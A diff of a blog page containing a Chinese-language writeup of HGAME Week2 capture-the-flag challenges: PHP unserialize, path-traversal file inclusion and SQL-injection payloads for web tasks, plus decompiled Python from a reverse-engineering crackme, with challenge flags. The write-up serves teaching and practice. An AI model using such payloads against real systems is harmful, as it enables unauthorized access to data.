@@ -1,147 +1,187 @@
+
+
 <!DOCTYPE html>
-<html lang=en>
+<html lang="en" xmlns:v-bind="http://www.w3.org/1999/xhtml">
 <head>
-    <!-- so meta -->
     <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="HandheldFriendly" content="True">
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
-    <meta name="description" content="这周赶上过年，两整天做不了题，写得比较赶（现在是凌晨五点，失眠……干脆写 wp），见谅。 { Web }Random? [250]根据提示，访问 /.random.php.swp 并 vim -r random.php 得到源码。以“unserialize ctf -魔术”为关键词在谷歌搜到这篇文章。知识点：PHP 的引用赋值，构造 ?emmm=O:4:&amp;quot;emmm&amp;quot;:2:{s:">
-<meta name="keywords" content="CTF,Writeup,Reverse,HGAME,Web,Pwn,Misc,Crypto,ROP,RSA">
-<meta property="og:type" content="article">
-<meta property="og:title" content="HGAME Week2 Writeup">
-<meta property="og:url" content="https://oyiadin.github.io/2018/writeup-of-hgame-week2/index.html">
-<meta property="og:site_name" content="oyiadin">
-<meta property="og:description" content="这周赶上过年，两整天做不了题，写得比较赶（现在是凌晨五点，失眠……干脆写 wp），见谅。 { Web }Random? [250]根据提示，访问 /.random.php.swp 并 vim -r random.php 得到源码。以“unserialize ctf -魔术”为关键词在谷歌搜到这篇文章。知识点：PHP 的引用赋值，构造 ?emmm=O:4:&amp;quot;emmm&amp;quot;:2:{s:">
-<meta property="og:locale" content="en">
-<meta property="og:image" content="https://oyiadin.github.io/2018/writeup-of-hgame-week2/re3.png">
-<meta property="og:image" content="https://oyiadin.github.io/2018/writeup-of-hgame-week2/misc3.png">
-<meta property="og:updated_time" content="2018-03-07T12:27:41.592Z">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="HGAME Week2 Writeup">
-<meta name="twitter:description" content="这周赶上过年，两整天做不了题，写得比较赶（现在是凌晨五点，失眠……干脆写 wp），见谅。 { Web }Random? [250]根据提示，访问 /.random.php.swp 并 vim -r random.php 得到源码。以“unserialize ctf -魔术”为关键词在谷歌搜到这篇文章。知识点：PHP 的引用赋值，构造 ?emmm=O:4:&amp;quot;emmm&amp;quot;:2:{s:">
-<meta name="twitter:image" content="https://oyiadin.github.io/2018/writeup-of-hgame-week2/re3.png">
-    
-    
-        
-          
-              <link rel="shortcut icon" href="../../images/favicon.ico">
-          
-        
-        
-          
-            <link rel="icon" type="image/png" href="../../images/favicon-192x192.png" sizes="192x192">
-          
-        
-        
-          
-            <link rel="apple-touch-icon" sizes="180x180" href="../../images/apple-touch-icon.png">
-          
-        
-    
-    <!-- title -->
-    <title>HGAME Week2 Writeup</title>
-    <!-- styles -->
+    <meta name="X-UA-Compatible" content="IE=edge">
+    <meta name="author" content="oyiadin">
+
+    <title>HGAME Week2 Writeup - oyiadin</title>
+    <meta name="description" content="">
+
+    <meta name="keywords"
+          content="">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+    <meta content="yes" name="apple-mobile-web-app-capable">
+    <meta content="black" name="apple-mobile-web-app-status-bar-style">
+    <meta content="telephone=no" name="format-detection">
+    <meta name="renderer" content="webkit">
+    <noscript>
+        <link rel="stylesheet" href="//fonts.googleapis.com/css?family=Source+Sans+Pro:400|Montserrat|Anonymous+Pro:400|Material+Icons"/>
+    </noscript>
+    <link rel="short icon" href="../../favicon/favicon.ico" type="image/x-icon">
+    <link rel="stylesheet" href="../../css/bootstrap.min.css">
+    <link rel="stylesheet" href="../../css/mprogress.css">
+    <link rel="stylesheet" href="../../css/open-iconic.min.css">
     <link rel="stylesheet" href="../../css/style.css">
-    <!-- rss -->
-    
-    
-      <link rel="alternate" href="../../atom.xml" title="oyiadin" type="application/atom+xml" />
-    
+    <link rel="stylesheet" href="../../css/prism.css">
+    <link rel="alternate" type="application/atom+xml" title="ATOM 1.0" href="../../atom.xml">
+    <script>
+        /*!
+         loadCSS: load a CSS file asynchronously.
+         [c]2014 @scottjehl, Filament Group, Inc.
+         Licensed MIT
+         */
+        function loadCSS( href, before, media ){
+            "use strict";
+            var ss = window.document.createElement( "link" );
+            var ref = before || window.document.getElementsByTagName( "script" )[ 0 ];
+            var sheets = window.document.styleSheets;
+            ss.rel = "stylesheet";
+            ss.href = href;
+            ss.media = "only x";
+            ref.parentNode.insertBefore( ss, ref );
+            function toggleMedia(){
+                var defined;
+                for( var i = 0; i < sheets.length; i++ ){
+                    if( sheets[ i ].href && sheets[ i ].href.indexOf( href ) > -1 ){
+                        defined = true;
+                    }
+                }
+                if( defined ){
+                    ss.media = media || "all";
+                }
+                else {
+                    setTimeout( toggleMedia );
+                }
+            }
+            toggleMedia();
+            return ss;
+        }
+    </script>
 </head>
-
 <body>
-    
-      <div id="header-post">
-  <a id="menu-icon" href="#" class="active"><i class="fa fa-bars fa-lg"></i></a>
-  <a id="menu-icon-tablet" href="#" class="active"><i class="fa fa-bars fa-lg"></i></a>
-  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
-  <span id="menu" style="visibility: visible;">
-    <span id="nav">
-      <ul>
-         
-          <li><a href="../../index.html">Home</a></li>
-         
-          <li><a href="../../archives/">Archives</a></li>
-         
-          <li><a href="../../about/">About</a></li>
-        
-      </ul>
-    </span>
-    <br/>
-    <span id="actions">
-      <ul>
-        
-        <li><a class="icon" href="../writeup-of-hgame-week3/"><i class="fa fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
-        
-        
-        <li><a class="icon" href="../writeup-of-hgame-week1/"><i class="fa fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
-        
-        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
-        <li><a class="icon" href="#"><i class="fa fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
-      </ul>
-      <span id="i-prev" class="info" style="display:none;">Previous Post</span>
-      <span id="i-next" class="info" style="display:none;">Next Post</span>
-      <span id="i-top" class="info" style="display:none;">Back To Top</span>
-      <span id="i-share" class="info" style="display:none;">Share Post</span>
-    </span>
-    <br/>
-    <div id="share" style="display: none">
-      <ul>
-  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://oyiadin.github.io/2018/writeup-of-hgame-week2/"><i class="fa fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://twitter.com/share?url=https://oyiadin.github.io/2018/writeup-of-hgame-week2/&text=HGAME Week2 Writeup"><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://oyiadin.github.io/2018/writeup-of-hgame-week2/&title=HGAME Week2 Writeup"><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://oyiadin.github.io/2018/writeup-of-hgame-week2/&is_video=false&description=HGAME Week2 Writeup"><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=HGAME Week2 Writeup&body=Check out this article: https://oyiadin.github.io/2018/writeup-of-hgame-week2/"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="https://getpocket.com/save?url=https://oyiadin.github.io/2018/writeup-of-hgame-week2/&title=HGAME Week2 Writeup"><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://reddit.com/submit?url=https://oyiadin.github.io/2018/writeup-of-hgame-week2/&title=HGAME Week2 Writeup"><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://oyiadin.github.io/2018/writeup-of-hgame-week2/&title=HGAME Week2 Writeup"><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://digg.com/submit?url=https://oyiadin.github.io/2018/writeup-of-hgame-week2/&title=HGAME Week2 Writeup"><i class="fa fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://oyiadin.github.io/2018/writeup-of-hgame-week2/&name=HGAME Week2 Writeup&description="><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
-</ul>
 
+<div id="app">
+    <nav ref="navBar" class="navbar fixed-top navbar-light">
+    <div id="global-loading-indicator" class="progress-line global-loading-indicator"></div>
+    <div id="nav_background" class="nav-background"></div>
+    <div style="padding-left: 15px;padding-right: 15px" class="container container-narrow nav-content">
+
+        <button id="nav_dropdown_btn" class="nav-dropdown-toggle" type="button" data-toggle="adropdown">
+            <span class="oi" data-glyph="menu"></span>
+        </button>
+        <a id="nav_title" class="navbar-brand Montserrat" href="/">
+            oyiadin
+        </a>
+        <div class="float-right navbar-dark nav-icon-group">
+            <div class="dropdown">
+                <ul class="dropdown-menu" id="collapsed_nav">
+                    <li><a href="/" class="a-block nav-icon">Archive</a></li>
+                    
+                    
+                    <li><a href="/about/index.html" class="a-block nav-icon">About Me &amp; Links</a></li>
+                    
+                    
+                    <li><a href="/atom.xml" target="_blank" class="a-block">
+                            <span data-glyph="rss" class="oi nav-icon"></span>
+                        </a>
+                    </li>
+                    
+                </ul>
+            </div>
+
+        </div>
     </div>
-    <div id="toc">
-      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">1.</span> <span class="toc-text">{ Web }</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Random-250"><span class="toc-number">1.1.</span> <span class="toc-text">Random? [250]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#草莓社区-1-100"><span class="toc-number">1.2.</span> <span class="toc-text">草莓社区-1 [100]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xss-2-150"><span class="toc-number">1.3.</span> <span class="toc-text">xss-2 [150]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#最简单的sql题-50"><span class="toc-number">1.4.</span> <span class="toc-text">最简单的sql题 [50]</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Re"><span class="toc-number">2.</span> <span class="toc-text">{ Re }</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#miaomiaowu-200"><span class="toc-number">2.1.</span> <span class="toc-text">miaomiaowu [200]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Iccanobif-250"><span class="toc-number">2.2.</span> <span class="toc-text">Iccanobif [250]</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pwn"><span class="toc-number">3.</span> <span class="toc-text">{ Pwn }</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-shellcode-100"><span class="toc-number">3.1.</span> <span class="toc-text">ez_shellcode [100]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-bash-jail-100"><span class="toc-number">3.2.</span> <span class="toc-text">ez bash jail [100]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hacker-system-ver1-100"><span class="toc-number">3.3.</span> <span class="toc-text">hacker_system_ver1 [100]</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-number">4.</span> <span class="toc-text">{ Misc }</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#咻咻咻-200"><span class="toc-number">4.1.</span> <span class="toc-text">咻咻咻 [200]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#White-cosmos-150"><span class="toc-number">4.2.</span> <span class="toc-text">White cosmos [150]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easy-password-150"><span class="toc-number">4.3.</span> <span class="toc-text">easy password [150]</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto"><span class="toc-number">5.</span> <span class="toc-text">{ Crypto }</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#easy-rsa-150"><span class="toc-number">5.1.</span> <span class="toc-text">easy rsa [150]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#The-same-simple-RSA-150"><span class="toc-number">5.2.</span> <span class="toc-text">The same simple RSA [150]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Caesar-amp-amp-Caesar-200"><span class="toc-number">5.3.</span> <span class="toc-text">Caesar&amp;&amp;Caesar [200]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#violence-200"><span class="toc-number">5.4.</span> <span class="toc-text">violence [200]</span></a></li></ol></li></ol>
-    </div>
-  </span>
-</div>
+</nav>
+    <div class="container container-narrow">
 
-    
-    <div class="content index width mx-auto px2 my4">
-        
-        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
-  <header>
-    
-    <h1 class="posttitle" itemprop="name headline">
-        HGAME Week2 Writeup
-    </h1>
+        <div ref="pageHead"
+             v-bind:style="{ transform: 'translateZ(0px) translateY('+.3*scrollY+'px)', opacity: 1-navOpacity }"
+             class="page-head">
+            <a href="/">
+                <h2>oyiadin</h2>
+                <h5>Shares anything interesting.</h5>
+            </a>
+        </div>
+
+<div class="row stream-container">
+    <div class="card-container">
+
+        <div class="card card-item clear-border card-top-patch card-clear-hover">
+            
+
+            <div class="card-item-container clear-flex-xs">
+                <div class="card-inner-cell">
+                    <h2>HGAME Week2 Writeup</h2>
+
+                    <div>
+                        <p>
+                            <time datetime="2018-02-19T03:47:41.000Z" itemprop="datePublished">
+                                2018-02-19 11:47
+                            </time>
+                            
+
+                            
+                            
+                            <span class="oi" data-glyph="tag" style="vertical-align: middle; margin-left: 5px"> </span>&nbsp;
+                            
+                            <a href='/tags/CTF/'>CTF</a>
+                            
+                            ,
+                            
+                            
+                            <a href='/tags/Writeup/'>Writeup</a>
+                            
+                            ,
+                            
+                            
+                            <a href='/tags/Reverse/'>Reverse</a>
+                            
+                            ,
+                            
+                            
+                            <a href='/tags/HGAME/'>HGAME</a>
+                            
+                            ,
+                            
+                            
+                            <a href='/tags/Web/'>Web</a>
+                            
+                            ,
+                            
+                            
+                            <a href='/tags/Pwn/'>Pwn</a>
+                            
+                            ,
+                            
+                            
+                            <a href='/tags/Misc/'>Misc</a>
+                            
+                            ,
+                            
+                            
+                            <a href='/tags/Crypto/'>Crypto</a>
+                            
+                            ,
+                            
+                            
+                            <a href='/tags/ROP/'>ROP</a>
+                            
+                            ,
+                            
+                            
+                            <a href='/tags/RSA/'>RSA</a>
+                            
+                            
+                            
+                        </p>
+                    </div>
 
 
-
-    <div class="meta">
-      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
-        <span itemprop="name">oyiadin</span>
-      </span>
-      
-    <div class="postdate">
-        <time datetime="2018-02-19T03:47:41.000Z" itemprop="datePublished">2018-02-19</time>
-    </div>
-
-
-      
-    <div class="article-tag">
-        <i class="fa fa-tag"></i>
-        <a class="tag-link" href="../../tags/CTF/">CTF</a>, <a class="tag-link" href="../../tags/Crypto/">Crypto</a>, <a class="tag-link" href="../../tags/HGAME/">HGAME</a>, <a class="tag-link" href="../../tags/Misc/">Misc</a>, <a class="tag-link" href="../../tags/Pwn/">Pwn</a>, <a class="tag-link" href="../../tags/ROP/">ROP</a>, <a class="tag-link" href="../../tags/RSA/">RSA</a>, <a class="tag-link" href="../../tags/Reverse/">Reverse</a>, <a class="tag-link" href="../../tags/Web/">Web</a>, <a class="tag-link" href="../../tags/Writeup/">Writeup</a>
-    </div>
-
-
-    </div>
-  </header>
-  
-
-  <div class="content" itemprop="articleBody">
-    <p>这周赶上过年，两整天做不了题，写得比较赶（现在是凌晨五点，失眠……干脆写 wp），见谅。</p>
+                    <p class=" post-block-desc">
+                        <p>这周赶上过年，两整天做不了题，写得比较赶（现在是凌晨五点，失眠……干脆写 wp），见谅。</p>
 <h2 id="Web"><a href="#Web" class="headerlink" title="{ Web }"></a>{ Web }</h2><h3 id="Random-250"><a href="#Random-250" class="headerlink" title="Random? [250]"></a>Random? [250]</h3><p>根据提示，访问 <code>/.random.php.swp</code> 并 <code>vim -r random.php</code> 得到源码。以<code>“unserialize ctf -魔术”</code>为关键词在谷歌搜到<a href="http://lzx.dropsec.xyz/2017/03/29/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" target="_blank" rel="noopener">这篇文章</a>。知识点：PHP 的引用赋值，构造 <code>?emmm=O:4:&quot;emmm&quot;:2:{s:6:&quot;public&quot;;N;s:6:&quot;secret&quot;;R:2;}</code> 即可得到 Flag：hgame{&amp;_Is_wondeRful!@# }</p>
 <h3 id="草莓社区-1-100"><a href="#草莓社区-1-100" class="headerlink" title="草莓社区-1 [100]"></a>草莓社区-1 [100]</h3><p>随便点一个猫片，发现地址栏为 <code>http://118.25.18.223:10011/show_maopian.php?mao=1.jpg</code>，文件引入很可能不带过滤，则构造 <code>?mao=../flag.php</code> 可得到 <code>flag.php</code> 的内容 <code>PD9waHAKCSRmbGFnPSJoZ2FtZXsjTWEwX3BpNG5faGFPX2s0bl9tYSN9IjsK</code>，解 base64 可得 Flag：hgame</p>
 <p>知识点：括号被过滤掉时，可以用 ` 绕过。</p>
@@ -154,145 +194,88 @@
 </ol>
 <h3 id="最简单的sql题-50"><a href="#最简单的sql题-50" class="headerlink" title="最简单的sql题 [50]"></a>最简单的sql题 [50]</h3><p>送分题，万能密码 <code>&#39; or &#39;1&#39;=&#39;1</code>，Flag：hgame{@s0ng_fen_ti@}</p>
 <h2 id="Re"><a href="#Re" class="headerlink" title="{ Re }"></a>{ Re }</h2><h3 id="miaomiaowu-200"><a href="#miaomiaowu-200" class="headerlink" title="miaomiaowu [200]"></a>miaomiaowu [200]</h3><p>观察发现是用 py 写的，而且有 py2exe 字样，找到一个 <code>unpy2exe</code> 工具，得到一个 pyc 文件，再次反编译得到源码，整理后如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Embedded file name: fvck.py</span></span><br><span class="line"><span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_key</span><span class="params">(arg=<span class="string">'1543788'</span>)</span>:</span></span><br><span class="line">    arg = int(arg)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">95</span>, int(arg / <span class="number">2</span> + <span class="number">1</span>)):</span><br><span class="line">        <span class="keyword">if</span> arg % i == <span class="number">0</span>:</span><br><span class="line">            print(hex(i), <span class="string">' '</span>)</span><br><span class="line">            <span class="keyword">return</span> print_key(arg / i)</span><br><span class="line">    print(arg)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_md5</span><span class="params">(arg)</span>:</span></span><br><span class="line">    m = md5.new()</span><br><span class="line">    m.update(arg)</span><br><span class="line">    <span class="keyword">return</span> m.hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_base64</span><span class="params">(arg=<span class="string">'Fuck1ng11'</span>)</span>:</span></span><br><span class="line">    <span class="comment"># string.oo_0</span></span><br><span class="line">    _all = list(string.ascii_uppercase + string.ascii_lowercase) + list(string.digits) + [<span class="string">'+'</span>, <span class="string">'/'</span>]</span><br><span class="line">    bin_ed = [ <span class="string">'&#123;:0&gt;6&#125;'</span>.format(str(bin(_all.index(i))).replace(<span class="string">'0b'</span>, <span class="string">''</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> arg <span class="keyword">if</span> i != <span class="string">'='</span> ]</span><br><span class="line">    result = <span class="string">''</span></span><br><span class="line">    count = arg.count(<span class="string">'='</span>)</span><br><span class="line">    <span class="keyword">while</span> bin_ed:</span><br><span class="line">        four_letter = <span class="string">''</span>.join(bin_ed[:<span class="number">4</span>])</span><br><span class="line">        <span class="keyword">if</span> len(four_letter) % <span class="number">8</span> != <span class="number">0</span>:</span><br><span class="line">            four_letter = four_letter[<span class="number">0</span>:<span class="number">-2</span> * count]</span><br><span class="line">        o1_o1 = [ four_letter[x:x + <span class="number">8</span>] <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="number">0</span>, <span class="number">8</span>, <span class="number">16</span>] ]</span><br><span class="line">        o1_o1 = [ int(x, <span class="number">2</span>) <span class="keyword">for</span> x <span class="keyword">in</span> o1_o1 <span class="keyword">if</span> x ]</span><br><span class="line">        result += <span class="string">''</span>.join([ chr(x) <span class="keyword">for</span> x <span class="keyword">in</span> o1_o1 ])</span><br><span class="line">        bin_ed = bin_ed[<span class="number">4</span>:]</span><br><span class="line">    <span class="keyword">return</span> result  <span class="comment"># RnVjazFuZzEx,  9 -&gt; 12</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Welcome to hammer's miaomiaowu"</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Give me your choice:'</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'1) fuck hammer'</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'2) hit hammer'</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'3) save hammer'</span></span><br><span class="line"></span><br><span class="line">        choice = raw_input()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> choice == <span class="string">'1'</span>:</span><br><span class="line">            lll = raw_input(<span class="string">'plz input your public key:'</span>)</span><br><span class="line">            <span class="keyword">if</span> lll == <span class="string">'1543788'</span>:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">'Here is your key:'</span></span><br><span class="line">                print_key(lll)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> choice == <span class="string">'2'</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">'Hammer was the mouth of the b_all, only issued a "wuwu" voice, but he wrote a figure on the w_all: 1543788'</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> choice == <span class="string">'3'</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"You must give me the flag , or you can't save hammer jiejie as your rbq!\n"</span></span><br><span class="line">            <span class="keyword">print</span> <span class="string">'But I must know who are you , give me your key:'</span></span><br><span class="line">            key = raw_input()</span><br><span class="line"></span><br><span class="line">            flag = raw_input(<span class="string">'Now , give me your flag:'</span>)</span><br><span class="line">            flag_p3 = flag[<span class="number">-4</span>:<span class="number">-1</span>]  <span class="comment"># length == 3</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> flag_p3 != key:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">'Unknown key!'</span></span><br><span class="line">                <span class="keyword">print</span> <span class="string">'(You are taken as an intruder, captured as rbp.)'</span></span><br><span class="line">                exit()</span><br><span class="line"></span><br><span class="line">            get_base64 = open(<span class="string">'1.jpeg'</span>, <span class="string">'r'</span>)</span><br><span class="line"></span><br><span class="line">            get_base64.seek(<span class="number">1024</span>, <span class="number">0</span>)</span><br><span class="line">            o = get_md5(get_base64.read(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">            get_base64.seek(<span class="number">512</span>, <span class="number">1</span>)</span><br><span class="line">            oo = get_md5(get_base64.read(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">            get_base64.seek(<span class="number">256</span>, <span class="number">1</span>)</span><br><span class="line">            ooo = get_md5(get_base64.read(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">            get_base64.seek(<span class="number">128</span>, <span class="number">1</span>)</span><br><span class="line">            ooo0 = get_md5(get_base64.read(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">            <span class="keyword">print</span> <span class="string">'Pay attention, The program may be abnormal'</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> o != <span class="string">'0d61f8370cad1d412f80b84d143e1257'</span>:  <span class="comment"># C</span></span><br><span class="line">                <span class="keyword">print</span> <span class="string">'Error flag!'</span></span><br><span class="line">                <span class="keyword">print</span> <span class="string">'(You are taken as an intruder, captured as rbp.)'</span></span><br><span class="line">                exit()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> oo != <span class="string">'cfcd208495d565ef66e7dff9f98764da'</span>:  <span class="comment"># 0</span></span><br><span class="line">                <span class="keyword">print</span> <span class="string">'Error flag!'</span></span><br><span class="line">                <span class="keyword">print</span> <span class="string">'(You are taken as an intruder, captured as rbp.)'</span></span><br><span class="line">                exit()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ooo != <span class="string">'8277e0910d750195b448797616e091ad'</span>:  <span class="comment"># d</span></span><br><span class="line">                <span class="keyword">print</span> <span class="string">'Error flag!'</span></span><br><span class="line">                <span class="keyword">print</span> <span class="string">'(You are taken as an intruder, captured as rbp.)'</span></span><br><span class="line">                exit()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ooo0 != <span class="string">'e4da3b7fbbce2345d7772b0674a318d5'</span>:  <span class="comment"># 5</span></span><br><span class="line">                <span class="keyword">print</span> <span class="string">'Error flag!'</span></span><br><span class="line">                <span class="keyword">print</span> <span class="string">'(You are taken as an intruder, captured as rbp.)'</span></span><br><span class="line">                exit()</span><br><span class="line"></span><br><span class="line">            flag_p2 = o + oo + ooo + ooo0  <span class="comment"># C0d5</span></span><br><span class="line"></span><br><span class="line">            flag_p1 = flag[<span class="number">6</span>:<span class="number">15</span>]  <span class="comment"># 9, hgame&#123; Fuck1ng11 _ C0d5 _ orz &#125;</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> unknown_function(flag_p1) != <span class="string">'RnVjazFuZzEx'</span>:</span><br><span class="line">                <span class="keyword">print</span> <span class="string">'Error flag5!'</span></span><br><span class="line">                <span class="keyword">print</span> <span class="string">'(You are taken as an intruder, captured as rbp.)'</span></span><br><span class="line">                exit()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">print</span> <span class="string">'Yeah! You got it!'</span></span><br><span class="line">            <span class="keyword">print</span> <span class="string">'hgame&#123;'</span> + flag_p1 + <span class="string">'_'</span> + flag_p2 + <span class="string">'_'</span> + flag_p3 + <span class="string">'&#125;'</span></span><br></pre></td></tr></table></figure>
